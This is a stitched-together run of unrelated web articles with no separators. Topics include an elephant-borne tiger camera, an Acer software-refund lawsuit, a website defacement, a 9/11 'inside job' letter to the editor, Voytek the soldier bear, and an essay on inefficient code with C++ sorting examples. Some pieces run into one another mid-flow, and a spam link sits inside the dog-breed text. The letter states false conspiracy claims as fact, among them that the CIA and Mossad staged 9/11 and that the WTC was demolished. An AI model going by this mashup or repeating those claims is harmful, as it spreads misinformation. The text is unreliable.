Along the way , images of other animals were captured by chance - or when the otherwise camera - shy creatures investigated the equipment .

Nice work , detective :
An elephant with a ' trunk - cam '
Downer said he came up with the idea three years ago when his team started filming the tigers .
He noticed how gently the forest elephants carried firewood to their camp and wondered if they'd be as delicate with a camera .
" And they were , " he enthused .
" Elephants do not see tigers as a threat , and tigers are comfortable with elephants .
So we had the perfect team . "
The langur monkeys in the reserve provide fascinating pictures as they became transfixed by their reflections in the log-cams .

But , explained Downer : " Elephants are natural inhabitants of the reserve , so the tigers are n't fazed at all by them .
Eventually , they realise that we humans are no risk either .
" So we became , effectively , invisible - filming one of the world 's most beautiful creatures in a way no one has ever done before . "

A French man has won a lawsuit against computer maker
Acer over a laptop he bought that came pre-loaded with Microsoft 's Windows XP and other applications he did n't want .
Antoine Gutzwiller disputed the fact that he had no choice but to buy the €599 Acer notebook with the ubiquitous operating system and software products including Microsoft Works , PowerDVD , and Norton AV .
The court of Puteaux in France ruled that the PC giant , which is the world 's third largest computer vendor , should refund Gutzwiller € 311.85 to cover the full cost of software loaded on his machine .
Intially , Acer offered to settle for just € 30 for the software bundled on Gutzwiller 's laptop , but he rejected that sum and took the firm to court - ending up with reimbursements worth nearly double that of the original cost of the machine .
Under the judgement , the court said Acer should also cough up € 500 in fees to cover what it described as " abusive resistance and committed expenses " .
Apparently , the dispute had rumbled on for nearly a year .
It is unknown whether the French court ruling could set a precedent for future European cases involving pre-loaded software .
Acer has yet to respond to our requests for comment . ®
CLEANLINESS may be a virtue , but when it comes to hair ?
Apparently , not so much .
For Allison Drescher , a consultant in Boston , shampooing has become a weekly ritual she outsources .
“ I get it washed and blown out once a week , ” Ms. Drescher , 35 , said .
“ It ’s just one less thing to worry about day to day . ”
Her stylist , Jeffrey Lyle at Emerge Spa and Salon , suggested it for convenience and for allure .
“ When it ’s a little dirty , it actually looks smoother and shinier , ” Mr. Lyle said .
Decades ago , a hairdresser ’s most loyal customers  the Norms and Cliffs of salons  were grannies who would regularly come in to have their hair shampooed and set .
For generations , the very idea of shampooing at home was almost taboo .
First Forensic Forum - a UK based association of computer security professionals - has been hacked .
F3.org 's website was defaced ( screen shot here ) with a message poking fun at the association of computer forensic experts .
The timing of the defacement on Thursday was fortuitous ( or well planned ) since the organisation is coming to the end of a two day conference .
The perpetrator of the attack posted a message taunting the organisation .
" The F3 For Security Hacked .
What 's Happened In The world .
Thay Are No Security Or What , " S4udi-S3curity - T3rror writes .
Ouch .
Well at least First Forensic Forum has no shortage of experts in recovering from security attacks to call on for help .
Curiously other pages ( example ) behind the front page defacement are operating normally .
Defacements are the high - tech equivalent of digital graffiti .
Normally they arise from misconfiguration of web server software or vulnerabilities left open by third party hosting firms or webmasters .
Such attacks are generally trivial even though , when inflicted on security related organisations , no less embarrassing for all that .

The Capital Times ( Madison , Wisconsin )
Kevin Barrett : Media are ignoring 9/11 whistle - blowers
Letter to the editor —
1/26/2008
Dear Editor : I am out of a job because The Capital Times and other mainstream media outlets refuse to report the news .
As a scholar , my job is to seek and report the truth , no matter where it leads .
That is also the job of the media .
Along with hundreds of other scholars , engineers , architects , and former high - level military , intelligence and executive branch officials ( patriotsquestion911.com ) , I have pointed out that the official story of 9/11 is a ridiculous fairy tale , contradicted at every turn by overwhelming evidence .
But rather than reporting on all of these people , and investigating the evidence they cite , the media singled me out for vicious attacks , up to and including a death threat from Bill O’Reilly .
Recently , the former president of Italy , Francesco Cossiga , stated publicly that the global intelligence community and the democratic forces in Europe know that the CIA and Mossad perpetrated the 9/11 attacks .
Why was n’t that front page headlines ?
Last week , the probable next prime minister of Japan , Yukihisa Fujita , grilled current prime minister Fukuda for half an hour about the controlled demolition of the World Trade Center and the staged events at the Pentagon and asked whether the Japanese police could arrest George W. Bush for his complicity in 9/11 .
Why was n’t that front page news ?
Japan , after all , is the world ’s second - largest economy , and if they are pulling the plug not just on financing the Iraq and Afghan wars , but the whole U.S. economy , because they know this country is led by 9/11 war criminals , maybe the American people should hear about it .
Also last week FBI whistle - blower Sibel Edmonds , who has implicated leading neocon ex-members of the Bush administration in the financing and coverup of 9/11 , made front page headlines in the UK .
Why wo n’t the U.S. media cover Edmonds , the most gagged whistle - blower in U.S. history ?
Why have the media refused to report on the 120 + senior military , intelligence service , law enforcement and government officials , 290 + engineers and architects , 60 + pilots and aviation professionals , 190 + professors , and 200 + 9/11 survivors and family members who have publicly blasted the official 9/11 fairy tale — many of them openly calling 9/11 an inside job
As for me , my reputation has been ruined , at least in the eyes of the fewer and fewer people naive enough to believe the mainstream media .
I can no longer practice my chosen profession , in training for which I invested more than 10 years of my life and tens of thousands of dollars , because the media singled me out for distorted coverage — while ignoring the hundreds of others vastly more qualified than I am who say the same things and refusing to investigate the evidence they cite .

Lone Rock
Iceberg Grounding on Seafloor ( Slow Down )
This sound was recorded May 19 , 1997 on the eastern equatorial Pacific Ocean autonomous hydrophone array .
The origin time and source location are 15:30 GMT near 62 °S , 60°W .
This is an area off the Antarctic Peninsula with numerous islands and shoals and it is highly probable that this sound was produced by a large iceberg as it became grounded .
The sound slowly descends in frequency over about 7 minutes as the drifting iceberg slows to a stop once it comes in contact with the seafloor , however it was of sufficient amplitude to be heard on three sensors at 110W , and 8S , 0 , and 8N , at a range of nearly 5,000 km .
The South American continent blocked the great circle path from this location to the three eastern sensors located along the 95° longitude line .
This type of signal has been recorded numerous times as large icebergs run aground ( MacAyeal et al. , 2008 ) .
Often , after a “ slowdown ” occurs , a “ speedup ” follows an aseismic eye of no seismicity associated with local slack tide .
This has been interpreted to reflect the acoustic energy of the grounded iceberg responding to the changing tides .

One of my favorite things about running this website is exposure to fabulous freaks I might otherwise not encounter .
I mean , I know all about my brand of weird ( left coast second gen hippie / retired raver / etc ) but it 's such a treat to see other delicious flavors of non-traditional .
Case in point : Siouxzi Rodeman and Alan Donnelly 's Steampunk wedding in Chicago .
( Some of you may remember Siouxzi — she 's the one who had that nightmare run-in at Macy 's a few months ago . )
https://www.flickr.com/photos/andibob909/2063970762
I was aware of Steampunk as a literary genre , but only just barely and not as a full - blown lifestyle / fashion thang .
Consider me now educated and inspired .
I completely fell in love with neo-victorian aesthetic once I started poking around in Siouxzi 's wedding photos — her wedding hat !
The custom ties for the bridesmaids and groomsmen !
The cakes !
The minister 's monoggle !
All the brass and the corsetry and the gears and springs !
What an awesome visual treat .
The fact that Souxzi was able to organize this stunning , stylish wedding in three months ( while also grieving her mother 's recent passing ) is totally mind - boggling and is a sharp ruler on the knuckles of anyone who says you can't plan a wedding in less than six months .
Congratulations , Souxzi !
But oh , there 's more .
So much more …
If you want to feel like you were actually there , check out this wedding video :

If you 're curious about steam fashion , it looks like this LJ community is a good place to start poking around .
And when you 're ready to immerse yourself in hundreds of photos , you can go here for shots from the wedding , and here for details like cake - toppers , hats , invites , etc .

Most free drug samples are not used to ease the burden of the poor or the uninsured , but rather go to those most able to pay for their prescriptions , according to a study by physicians from Cambridge Health Alliance and Harvard Medical School .
The study , which is the first to look at the free drug samples pharmaceutical companies provide to physicians , will appear in the February 2008 issue of the American Journal of Public Health .
The study found that use of free prescription drug samples is widespread , with more than one - in - ten Americans receiving one or more free drug samples in 2003 .
Almost 20 percent of those surveyed who take at least one prescription drug were given free samples .
Few free samples went to the needy , the study found : insured Americans and those with higher incomes were more likely to report receiving at least one free sample ; more than four - fifths of sample recipients were insured all year .
Conversely , less than one - fifth were uninsured for all or part of 2003 , and less than one - third had low family incomes ( under $ 37,000 for a family of four . )
The study also found that those with better access to medical care were consistently more likely to receive three samples .
Non-Hispanics , English - speakers and Whites were all more likely to receive free samples than were members of ethnic , linguistic or racial minorities .
Receiving medical care in an office and taking more medications also increased an individual 's chances of receiving free drug samples .
Author Sarah Cutrona , a physician at Cambridge Health Alliance and an Instructor of Medicine at Harvard commented : " The distribution of free samples has become very controversial .
Evidence shows that free samples may influence physicians ' prescribing behavior and cause safety problems .
For instance , we found that the most widely distributed sample in 2002 was Vioxx , with Celebrex being number 3 .
These drugs turned out to have lethal side effects .
While many doctors still view samples as a safety net for their neediest patients , our study shows that samples are potentially dangerous , and do little for the needy . "
David Himmelstein , senior author of the study , a physician at Cambridge Health Alliance and an Associate Professor of Medicine at Harvard adds : " We know that many doctors try to get free samples to needy patients when those patients come into the office .
We found that such efforts do not counter society - wide factors that determine access to care and selectively direct free samples to the affluent .
Our findings strongly suggest that free drug samples serve as a marketing tool , not as a safety net . "
" Free drug samples are not the solution to the disproportionately low amount of health care resources going to the poor and uninsured ; they are part of the problem , " said Steffie Woolhandler , a physician at Cambridge Health Alliance , Associate Professor of Medicine at Harvard , and study co-author .
The study used data on 32,681 US residents from the Medical Expenditure Panel Survey ( MEPS ) , an annual federal survey .
Dr. Cutrona 's work on the study was supported under a National Research Service Award .

Missing the implied comedy and danger evident in its very name , scientists are studying the Giant Red Spot of Jupiter to see just what secrets it can share about its home planet , according to the Discovery Channel .
The most recent interest in the eye comes following the discovery that , contrary to popular belief , it 's actually one of the more calm parts of the atmosphere of the planet .
Although , as Philip Marcus of the University of California explains , that 's not to say that it 's entirely benign .
" One of the interesting things we 've discovered about this is that when you try to recreate this in the lab , it 's highly , highly unstable , " Marcus told Discovery News .
" It just literally rips itself to shreds . "
Yet the real Giant Red Spot is one of the most stable features visible on Jupiter .
So what gives ?
" It 's telling us something about Jupiter , " said Marcus .
" There must be something special about Jupiter 's atmosphere that makes it different . "

That thing , of course , is the giant red spot in the middle of it .

Boxer Dog Temperament and Lifespan
by Olivia Nypan posted August 23 , 2016
The Boxer is a wonderful guard dog , which means that he is watchful and alert , self - assured and dignified .
This dog breed is quite playful and kind with children , but usually demonstrates a wary attitude towards strangers .
He responds politely to familiar people .
He is never aggressive without a reason , but can be very furious in dangerous situations when he needs to defend his family members .
The temperament of this dog can be somewhat corrected with the help of socialization and training .
Puppies have nice temperaments .
They are playful and like communication with people .
Boxers require early socialization to become outgoing , well - rounded , and friendly dogs .
The average lifespan of these dogs is between 9 and 12 years .
However , this dog breed is prone to cancer that can cause death prematurely .
How Much Does a Boxer Dog Cost and Price Range
The cost of Boxers varies from place to place and depends on what you are looking for .
You can find a good - looking puppy for a low price but he will not have the documents , some ftcpublishing.com/intellibed-reviews.html .
It means that he was bred in illegal way , and you may face hip problems , different diseases , and much more .
Thaty is why it is not recommended to buy the cheapest variants .
Pure breed dogs cost in the USA around 1200 - 1500 USD .
Maintaining your dog can be also expensive , especially taking into consideration the need to pay for the basics of training your puppy .

There has been no shortage of books chronicling the dystopia that is the Bush Administration .
And in this job , I 've read quite a few of them .
None of them have made as powerful an impact as Naomi Klein 's The Shock Doctrine .
I promise you , it will change how you look at government policy and responses .
It also finally sealed forever , for me at least , the coffin of the utter bollocks of Friedman economics .
Listen to me carefully , you free market fanatics : FRIEDMAN .
POLICIES .
DO .
NOT .
WORK .
PERIOD .
His version of ' free market economics ' STIFLES democracy .
They create an oligarchy that is the opposite of democracy .
Do n't believe me ?
Author Naomi Klein gives compelling examples in history proving that " Disaster Capitalism " has been the foundation of government 's actions and how none of it has been done for the benefit of the populace .
The creator of Mystery Science Theater 3000 is returning to the movie - mocking business as captain of the Cinematic Titanic .
Joel Hodgson is reuniting with J. Elvis Weinstein ( the original Tom Servo ) and Trace Beaulieu ( Crow T. Robot ) to sink any B movies remaining afloat in the long - running cult TV show 's wake .
The celluloid target of their inaugural Dec. 10 release : 1972 horror debacle Brain of Blood .
Hodgson and crew plan to mine the depths of the sci-fi and horror genres for movies that bear the special MST3K level of delightful god-awfulness .
Rather than call the reunion a " show , " Hodgson described Cinematic Titanic as " a movie - riffing delivery system " that will keep loyal MST3K enthusiasts stocked with fresh laughs .
" History has been very kind to us , " Hodgson said .
" We have a very loyal fan base , and every ( MST3K ) DVD set we release sells better than the previous one .
Since the supply of those original episodes is finite , we wanted to give our fans something new that kept the spirit and the tone of the original show . "
The original MST3K started in 1988 on Minnesota television , then aired for a decade on various national cable channels .
Created and initially hosted by Hodgson , the show endured a turnover of its entire cast before ending its run on the Sci Fi Channel in 1999 .
Earlier this year , the Sci Fi cast reunited to work on two separate MST3K - style satirical projects .
For Cinematic Titanic , Hodgson is partnering with movie - download service EZTakes to enable buyers to purchase and create DVDs themselves .
The Cinematic Titanic website will sell DVDs , and eventually buyers will be able to download the film , commentary , liner notes and cover art to " self - fan-u- facture " DVDs at home .
Cinematic Titanic 's five cast members ( MST3 K veterans Mary Jo Pehl and Frank Conniff also join the crew ) will appear on screen in a multi-tiered silhouette arrangement reminiscent of a shadowy Hollywood Squares set , as the mockable movies play .
To launch Cinematic Titanic , the cast will perform Dec. 8 for Industrial Light & Magic staffers at George Lucas ' Presidio campus in San Francisco , Hodgson said .
A DVD of the invitation - only show will be up for sale alongside the Brain of Blood release .
Will fans hoping for a reunion of the original MST3K embrace multiple spinoffs of their favorite show ?
Nathan Heckel of MSTies Anonymous said it 's encouraging to see the original show 's alumni collaborating .
" I 'm sure I 'm not the only one who'd like to see the original show revitalized , " Heckel said .
" Even a one - off performance would be greatly welcomed . "

Editor 's note : Lou Dobbs ' commentary appears every Wednesday on CNN.com
NEW YORK ( CNN ) --
We 're about 40 days away from November 's critically important midterm elections , and the campaign volume is rising .
The political strategists , campaign managers , and the partisan savants will be working overtime to excite their conservative , liberal , Republican and Democratic bases , trying to get at least 50 percent of us who 've registered to vote to actually go to the polls .
As in election years past , they 're going to have a lot of help , and not just from PACs , labor unions and 527 groups like MoveOn and Progress for America .
Oh no , we 're going to be treated to something akin to , and as close as we should expect to get to , divine intervention .
Evangelical Christians , Jews , Catholics , Muslims and Mormons are already getting rowdy , not only on their respective pulpits , but in the mail , on the air and certainly on the campaign trails .
Now I know you 're thinking that this is America , what is religion doing in politics and what is politics doing in religion .
As it turns out , just about everything .
And the politically correct orthodoxy would prefer you and I not take notice .
The First Amendment of our Constitution declares that , " Congress shall make no law respecting an establishment of religion , or prohibiting the free exercise thereof . "
But the devil 's in the details , if you will , and the often demonized Internal Revenue Service has taken up the issue where other federal agencies and branches of government have feared to tread :
This summer the IRS sent out a warning letter to more than 15,000 churches and tax - exempt nonprofit organizations throughout the nation .
The letter is meant to serve notice that any sort of politicking could endanger their tax - exempt status .
The IRS discovered a disturbing amount of intervention by religious groups in national politics in 2004 .
It determined nearly five dozen churches and charities violated laws against political activities , and there are now 40 active investigations into the politicking of various churches .
The mixture of religion and politics is on public display throughout the country .
The Mormon Church rolled out the red carpet for Mexican President Vicente Fox , embraces illegal immigrants in the state of Utah and helped pro-amnesty incumbent Congressman Chris Cannon with a get out the vote campaign .
Apparently nobody in the federal government is too concerned that the Catholic Church has repeatedly lobbied on behalf of millions of illegal aliens and their supporters for wholesale amnesty and open borders .
Until the Supreme Court ordered him to , the head of the Los Angeles Archdiocese , Cardinal Roger Mahoney , did n't think he should cooperate with the law when it came to divulging information on priests accused of pedophilia , and he believes it is entirely correct to encourage his parishioners to civil disobedience in the case of legislation that secures our borders and punishes those who cross them illegally .
The Cardinal disavows the will of the people in opposition to current law .
Ironically he's now spearheading a drive to register a million new voters by 2008 .
Where he 'll find them , only heaven knows .
The role of religion in politics and the role of politics in religion in this country has never deserved more attention and merited more intense examination than now .
Religion is dominant in the lives of most Americans :
The latest Gallup Poll reveals that nearly two - thirds of us are members of a church or synagogue and about one - third of us attend church or synagogue at least once a week .
Surveys show as many as 250 million Americans are Christian and 70 million of us describe ourselves as evangelicals .
Clearly , Christian Americans could dominate our political system , and many argue that the outcome of the 2004 presidential election was determined by Catholic voters who shunned Catholic candidate Sen .
John Kerry and bolstered born - again President George W. Bush , by a margin of 52 to 47 .
What is the Constitutional and appropriate role of religion in our political lives .
Rev. Barry Lynn of Americans United for Separation of Church and State says there are definite limits .
" What houses of worship cannot do , under federal law , is to endorse or oppose candidates for public office .
They may not use their resources to intervene in a partisan race .
Houses of worship cannot become cogs in anyone 's political machine . "
But is n't that exactly what is happening today ?
Some churches and nonprofits have become extensions of both Democratic and Republican political message machines at the local and national level .
The intrusion of religion into our political lives , in my opinion , should be rejected in the same fashion that we constitutionally guarantee government will not interfere with religion .
This issue is far too important to be left to the sole judgment of the Internal Revenue Service .
And it is time for all of us to examine closely , both in our communities and in our Congress , just what separation of church and state really means to us and to the nation .
Six weeks ago , 29 - year - old Culver City Internet copy writer Christian Lander started a blog , stuffwhitepeoplelike .
wordpress.com , on a whim , thinking he ’d poke fun at himself and fellow white people .
Spending roughly two hours a day writing satirical posts about “ stuff white people like , ” Lander had no idea how much his little inside joke would catch on .
In the first week , the site received about 200 hits a day .
The next week it jumped to 600 , and then 4,000 the next .
By last week , he was averaging 300,000 daily hits .
Lander , who arrived in L.A. from Toronto 2 1/2 years ago , came up with the idea for the blog after talking to a Filipino friend about how much they both liked the HBO police drama “ The Wire . ”
For some reason he ’s already forgotten , they both wished that more white people watched the show .
Which got him thinking :
What exactly do white people like ?
By “ white people , ” Lander does n’t actually mean the more than 221 million Americans who check that box on the decennial census .
But that ’s part of the fun .
Lander is doing to whites what scores of journalists and politicians do to non-white minorities every day , “ essentializing ” complex identities -- that is , stripping away all variety and reducing them to their presumed authentic essences .
One irony - deficient reader complained that the blog was less about white people than it was about yuppies .
And without knowing it , she was cutting to the heart of the joke .
Lander is gently making fun of the many progressive , educated , upper - middle - class whites who think they are beyond ethnicity or collectively shared tastes , styles or outlook .
He ’s essentially reminding them that they too are part of a group .
Advertisement
“ I ’m writing about the white people who think they ’re absolutely unique and individual , ” Lander told me .
“ I ’m calling them out and poking fun of myself .
The things I post are all the things I like too ! ”
And what are those things ?
Recycling , expensive sandwiches , standing still at concerts , Toyota Priuses , natural medicine , irony , public radio , breakfast places , vegetarianism , organic foods and being an expert on ethnic cultures are just a few .
Lander thinks that most of his readers are actually members of the elite group he ’s lampooning .
Some of the comments on the blog suggest that he ’s right .
“ Oh , lord , it only hurts because it ’s true !
Love the blog , ” one reader who calls herself White Lady wrote .
But others are more perplexed .
Responding to a blog entry claiming that white people like Sarah Silverman , MC wrote , “ I ’m white and I HATE Sarah Silverman ( and would take Monique ... ANYDAY , so there . ” )
Still another offended and anonymous reader listed a lot of racist stereotypes about blacks , Mexicans , Arabs , Jews and Chinese to even the score .
As unusual as Lander ’s site is , it is also part of a sociological trend among whites who live in increasingly non-Anglo cities and regions : their transformation into a minority group .
Whites used to think of themselves as standard - issue American -- they had the luxury of not having to grapple with the significance of their own racial background ; they were “ us ” and everyone else was “ ethnic . ”
Not anymore .

“ Demographic shifts have put a new kind of pressure on that category of people who were once just considered the norm , ” says Mike Hill , author of “ After Whiteness : Unmaking an American Majority . ”
“ White identity is becoming particularized and minoritized .
No longer the normative category , it ’s becoming one of many identities . ”
This pressure naturally leads to a greater sense of self - consciousness as the new minority begins to negotiate their relationships with members of other minorities ( everyone else ) .
Still , Lander is less concerned with cross-ethnic and racial relations than he is with how whites treat each other .
As a onetime graduate student in the Midwest , he got tired of coastal condescension of the fly - over states and the glib assumption that “ red staters are evil and stupid . ”
“ Too many white people do n’t like to be reminded that they ’re white .
They like to think that white people are those evil corporate right - wingers or the uneducated masses who vote the wrong way .
But ‘ enlightened whites ’ are white people too and have just as much of a group mentality as they think the red staters have . ”
Advertisement
Still , Lander does n’t want you to think he ’s angry or taking himself too seriously .
“ First and foremost , it ’s satire ; it ’s funny , ” he says .
“ I ’m trying to make people laugh . ”
But he ’s doing so in a brave new world in which we ’re all becoming minorities , and nobody ’s really sure who ’s going to have the last laugh .

Voytek was billeted in the Borders ( Picture : Imperial War Museum )
The bear - named Voytek - was adopted in the Middle East by Polish troops in 1943 , becoming much more than a mascot .
The large animal even helped their armed forces to carry ammunition at the Battle of Monte Cassino .
Voytek - known as the Soldier Bear - later lived near Hutton in the Borders and ended his days at Edinburgh Zoo .
He was found wandering in the hills of Iran by Polish soldiers in 1943 .
He liked a cigarette , he liked a bottle of beer - he drank a bottle of beer like any man
Augustyn Karolewski
They adopted him and as he grew he was trained to carry heavy mortar rounds .
When Polish forces were deployed to Europe the only way to take the bear with them was to " enlist " him .
So he was given a name , rank and number and took part in the Italian campaign .
He saw action at Monte Cassino before being billeted - along with about 3,000 other Polish troops - at the army camp in the Scottish Borders .
The soldiers who were stationed with him say that he was easy to get along with .
" He was just like a dog - nobody was scared of him , " said Polish veteran Augustyn Karolewski , who still lives near the site of the camp .
The bear travelled with troops ( Picture : Imperial War Museum )
" He liked a cigarette , he liked a bottle of beer - he drank a bottle of beer like any man . "
When the troops were demobilised , Voytek spent his last days at Edinburgh Zoo .
Mr Karolewski went back to see him on a couple of occasions and found he still responded to the Polish language .
" I went to Edinburgh Zoo once or twice when Voytek was there , " he said .
" And as soon as I mentioned his name he would sit on his backside and shake his head wanting a cigarette .
" It was n't easy to throw a cigarette to him - all the attempts I made until he eventually got one . "
Voytek was a major attraction at the zoo until his death in 1963 .
Eyemouth High School teacher Garry Paulin is now writing a new book , telling the bear 's remarkable story .
' Totally amazing '
Local campaigner Aileen
Orr would like to see a memorial created at Holyrood to the bear she says was part of both the community and the area 's history .
She first heard about Voytek as a child from her grandfather , who served with the King 's Own Scottish Borderers .
" I thought he had made it up to be quite honest but it was only when I got married and came here that I knew in fact he was here , Voytek was here , " she said .
" When I heard from the community that so few people knew about him I began to actually research the facts .
" It is just amazing , the story is totally amazing . "

Computers make life easier because they 're so fast , right ?
Well , yes and no .
Do you write efficient code ?
The author reveals some disconcerting inefficiencies lurking in commonly used software and development practices .
As I write this , I 'm trying to install some popular diagnostic tools , downloaded from a popular computer manufacturer , onto my laptop , using a popular install program .
The install has been using 100 % of a CPU for half an hour .
That 's 4,503,273,209,800 clock cycles so far , time enough for 1,258,920,345,600 memory accesses and 180,000 random disk accesses .
Far more computing resources than were needed to first put humans on the moon .
What in the name of Turing is the install doing with those resources ?
I have no idea .
It refuses to be sampled by the activity monitor .
It says it 's searching my hard drive , but hard drive access is sporadic , and it could have traversed my hard drive many times by now .
And when asked to quit it emits a scary message about possibly leaving behind an " incomplete set of software " and encourages me to Resume .
So I Quit , and will wait for my machine to cool down enough to not scald my lap before I try again .
And I 'm not singling out this install .
My experience has long been that my new computers keep getting exponentially more powerful , thanks to Moore 's Imperative , but many of my new programs do n't get any faster at all , and some are unbelievably slow .
Molasses - in - January slow .
Sedated - sloth slow .
Anaesthesized - slug slow .
So how do we manage to waste such abundant resources ?
We have our ways .
Complexity
" You could look it up . " -- Yogi Berra
The computer science literature likes to think of computational complexity less than exponential as " tractable . "
If you have a big enough tractor maybe so , but in most work anything worse than near - linear is unacceptable .
So how do we wind up with quadratic , and worse , performance ?
Sometimes , as for most multivariate statistics , there are no better algorithms .
Matrix inversion is cubic , singular value decomposition is quadratic , and that 's that .
But when we have a choice , it matters .
This is easily seen by graphing e**x ( red ) , x** 2 ( orange ) , x* ln ( x ) ( green ) , x ( black ) and ln(x ) ( blue ) :
[ Note : one graphing calculator program hung and another crashed in the course of the few minutes I spent creating this graph .
Both are Java programs . ]
On this graph x and y run from 0 to 5 .
As x gets bigger y=e **x and y=x ** 2 rise ever more quickly , y=x * ln ( x ) approaches a straight line , y=x is a straight line , and y=ln ( x ) approaches a constant value .
Obviously , as x gets ever larger the near - linear , linear , and near - constant algorithms become ever more vastly preferable to super - linear ones .
[ Note : I got the notions of O( n log n ) as near - linear and O ( log n ) as near - constant from Sean Parent . ]
So consider the common problem of sorting an array .
The venerable bubble sort is easy to code , and is the kind of algorithm you might reinvent if you did n't know better :
template < typename iter > void bubblesort ( iter first , iter last ) { if ( last - first <= 1 ) return ; bool swapped ; do { swapped = false ; -- last ; for ( iter p = first ; p != last ; ++p ) if ( p [ 0 ] > p [ 1 ] ) { swap ( p [ 0 ] , p [ 1 ] ) ; swapped = true ; } } while ( swapped ) ; }
So what 's the problem ?
On average this routine takes quadratic time -- the number of operations is proportional to n** 2 .
Now this is a textbook example , but in general it is easy to go super - linear without knowing .
Just invoke a library routine or system call N times that is , unbeknownst to you , O ( N ) , and there you have it .
For example , the search algorithms in the C+ Standard are O ( log ( N ) ) when used with random - access iterators , but O ( N ) when used with input iterators .
Or ( re - ) invent an algorithm of non-obvious complexity , or implement a published algorithm of undocumented complexity , and expect to be surprised .
Worse , you wo n't notice any problem with your fast development machines and small test cases , but your customers will run more data on slower machines and hit the wall .
How to do better than bubblesort ?
Perhaps use Hoare 's Quicksort algorithm , which has near - linear O( n log n ) complexity on average :
template < typename iter > void quicksort ( iter first , iter last ) { if ( last - first <= 1 ) return ; iter p = first , q = last ; -- q ; iter pivot = p + ( q - p ) / 2 ; swap ( * pivot , * q ) ; iter mid = p ; for ( ; p != q ; ++p ) { if ( ! ( *p < * q ) ) continue ; swap ( * p , * mid ) ; ++mid ; } swap ( *q , * mid ) ; quicksort ( first , mid ) ; quicksort ( mid + 1 , last ) ; }
So how do we know which sort is faster ?
Maybe by just looking , or by testing , or by formal big - O analysis .
Or you could look it up .
void sort ( RandomAccessIterator first , RandomAccessIterator last ) ; ...
Sort all elements in the range [ first , last ) ... sort ( ) guarantees a good performance ( n - log - n ) on average .
However , if avoiding worst case performance is important , you should use partial_sort ( ) or stable_sort ( ) ... -- Josuttis 1999
Thanks to the Standard Library you often do n't have to get your algorithms right , you just have to get the right algorithms .
Looping
" It 's like deja vu all over again . " -- Yogi Berra
If you want to redline your CPU to no purpose , try this :
loop : goto loop ;
Silly , eh ?
But there are lots of less obvious ways to loop while accomplishing little or nothing , all of them leading to a runaway program .
Looping also amounts to How To Run Hot , where heat means wasted energy and fried equipment , and cooling also wastes a lot of expensive energy .
Spinning
" There must be some way out of here . " -- Bob Dylan
One common way to loop infinite is called spinning or busy waiting .
It typically shows up in logic like this :
loop : if ( !data_available ) goto loop ; get_data ( ) ;
If you know that the data will be available soon it works fine , but if not it 's just a waste .
One easy fix is to sleep while waiting , so as to yield the CPU to another thread :
loop : if ( !data_available ) { sleep ( timeout ) ; goto loop ; } get_data ( ) ;
You still may never get out of the loop , but at least you wo n't be hogging a CPU the whole time .
Hanging
" I 've been where you 're hanging , I think I can see how you 're pinned ... " -- Leonard Cohen
Consider :
f(x ) ;
What if f( ) never returns ?
Perhaps it is waiting on keyboard input , or an internet connection , or a hard drive access , or a semaphore , or some other event that may never occur .
At worst , you can leave it to the user to kill the hung program .
Better , f( ) will use a timeout to avoid waiting forever .
Or , failing that , you can run the loop in a separate thread or process that can be killed automatically when it appears to hang .
In some cases you can use an asynchronous I/O package like Boost. asio to avoid ever waiting at all .
One of the easiest ways to hang is to deadlock via the misuse of mutual - exclusion primitives that control access to shared resources by multiple threads or processes .
The classic deadly embrace looks like this :
// Thread 1 : // Thread 2 : acquire ( U ) ; acquire ( V ) ; acquire ( V ) ; acquire ( U ) ; . . . . . .
Note that these threads do not acquire their resources in the same order .
As a result , Thread 1 can acquire U at the same time as Thread 2 is acquiring V , and then neither thread can make progress as Thread 1 is waiting on V , which Thread 2 holds , and Thread 2 is waiting for U , which Thread 1 holds .
This may seem obvious , but is easy enough to do , especially as your patterns of resource acquisition get more subtle and complex .
The answer here is to stick as much as possible with higher - level idioms -- e.g. asynchronous I /O , two - phase locking , message passing , map - reduce -- that enforce safe use of the dangerous primitives .
Thrashing
" Hit me again , harder . " -- Cygwin error message
Consider some code that sums a square array :
for ( row = 0 ; row < N ; , ++row ) for ( col = 0 ; col < N ; ++col ) sum += A[row ] [ col ] ;
Or you can do it the other way round :
for ( col = 0 ; col < N ; ++col ) for ( row = 0 ; row < N ; ++row ) sum += A[row ] [ col ] ;
So does it matter ?
Indeed it does !
In C++ arrays are stored row - wise in contiguous memory .
So if you traverse the array rows first you will traverse the data sequentially .
That means that the next data point you need is likely to be in pipeline , cache , RAM , and the next hard drive sector before you need it .
But if you traverse columns first then you will be repeatedly reading just one item from each row before reading from the next row .
As a result your system 's caching and lookahead will fail , and you will waste a lot of time waiting for RAM , which is about three to five times slower than cache .
Even worse , you may wind up waiting for the hard drive , which can be millions of times slower than RAM if accessed in large random jumps .
How much time is wasted ?
On my machine summing a billion bytes row - wise takes 9 seconds , whereas summing them column - wise takes 51 seconds .
The less sequential your data acccess , the slower your program will run .
Cache ping - pong is a more subtle form of thrashing that can happen when more than one CPU is using data that is cached on the same line .
For example , say there are two CPUs using an array of structures :
struct flags { bool pushed ; bool popped ; } states [ N ] ;
There is no conflict :
One CPU touches only flags .
pushed , and the other only flags .
popped .
But if these two elements are cached together then when the first CPU modifies a flags .
pushed the cache coherence machinery will need to copy that cache line over to the second CPU 's cache .
Ping .
And when the second CPU modifies a flags .
popped its cache line will have to be copied over to the first CPU 's cache .
Pong .
The answer is to lay out your data in memory so that the elements needed by each CPU are on separate cache lines .
This may mean breaking up logical structures and spreading their elements across multiple arrays , in a pattern reminiscent of old - school FORTRAN :
struct flags { bool pushed [ N ] ; char pad [ LINE_SIZE ] ; bool popped [ N ] ; } states ;
Crashing
" You do n't come back from Dead Man 's Curve . " -- Jan and Dean
Consider :
*p = x
Easy enough .
But what if p==0 or some other invalid value ?
If you are lucky your program just stops when the virtual memory hardware traps the illegal access .
If you are unlucky your program or system state is corrupted .
If you are very unlucky a malicious person or program will take advantage of the corrupted state to infect your system , or even worse your customers ' systems .
So at best your program is doing nothing , and at worst your customers ' systems are hijacked as porn and warez servers .
Either way , no progress is slow progress .
The easiest way to avoid this is to avoid languages with undefined behavior , but that can mean non-trivial costs in runtime and memory , as we will see below .
And even safe languages can have bugs in their implementations , as we noted above .
Failing that , treat raw pointers and other opportunities for undefined behavior like infectious diseases , to be quarantined and tested for the safety of the program .
Indirection
" All problems in computer science can be solved by another level of indirection , but that usually will create another problem . " -- David Wheeler , inventor of the subroutine
As I write this I 'm running an awk program in the background .
My awk code is being interpreted by the gawk program , which is written in C .
